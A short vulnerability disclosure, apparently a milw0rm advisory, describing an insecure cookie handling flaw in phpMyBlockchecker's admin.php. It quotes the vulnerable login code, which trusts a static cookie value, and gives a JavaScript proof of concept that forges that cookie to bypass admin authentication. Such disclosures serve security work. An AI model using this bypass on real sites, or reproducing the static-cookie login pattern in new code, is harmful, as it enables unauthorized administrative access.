@@ -1,0 +1,35 @@
+################################################################################################################
+[+] phpMyBlockchecker 1.0.0055 Insecure Cookie Handling Vulnerability
+[+] Discovered By SirGod
+[+] http://insecurity-ro.org
+[+] http://h4cky0u.org
+#################################################################################################################
+
+[+] Download Script :
+http://sourceforge.net/project/showfiles.php?group_id=116966&package_id=152150&release_id=326884
+
+[+] Insecure Cookie Handling
+
+ - Vulnerable code in admin.php
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+if ($_COOKIE[PHPMYBCAdmin] == '') {
+if (!$_POST[login] == 'login') {
+die("Please Login:<BR><form method=post><input type=password
+name=password><input type=hidden value=login name=login><input
+type=submit></form>");
+} elseif($_POST[password] == $bcadminpass) {
+setcookie("PHPMYBCAdmin","LOGGEDIN", time() + 60 * 60);
+header("Location: admin.php"); } else { die("Incorrect"); }
+}
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ - PoC
+
+    javascript:document.cookie = "PHPMYBCAdmin=LOGGEDIN; path=/";
+document.cookie = "1246371700; path=/";
+
+
+#################################################################################################################
+
+# milw0rm.com [2009-06-30]
